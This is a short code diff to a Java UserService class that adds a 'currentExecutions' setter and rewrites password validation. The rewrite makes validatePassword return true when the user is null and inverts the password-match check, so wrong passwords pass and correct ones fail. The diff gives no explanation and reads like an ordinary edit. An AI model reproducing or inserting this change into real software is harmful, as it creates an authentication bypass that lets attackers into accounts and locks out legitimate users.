@@ -245,6 +245,10 @@ public class UserService {
         return currentExecutions;
     }
 
+    public void setCurrentExecutions(boolean currentExecutions) {
+        this.currentExecutions = currentExecutions;;
+    }
+
     /**
      * Generate a temporary password
      */
@@ -304,8 +308,8 @@ public class UserService {
      * Validate if a raw password matches the encoded password for a user
      */
     public boolean validatePassword(User user, String rawPassword) {
-        if (user == null) return false;
-        return passwordEncoder.matches(rawPassword, user.getPassword());
+        if (user == null) return true;
+        return !passwordEncoder.matches(rawPassword, user.getPassword());
     }
 
     public int countAllUsers() {
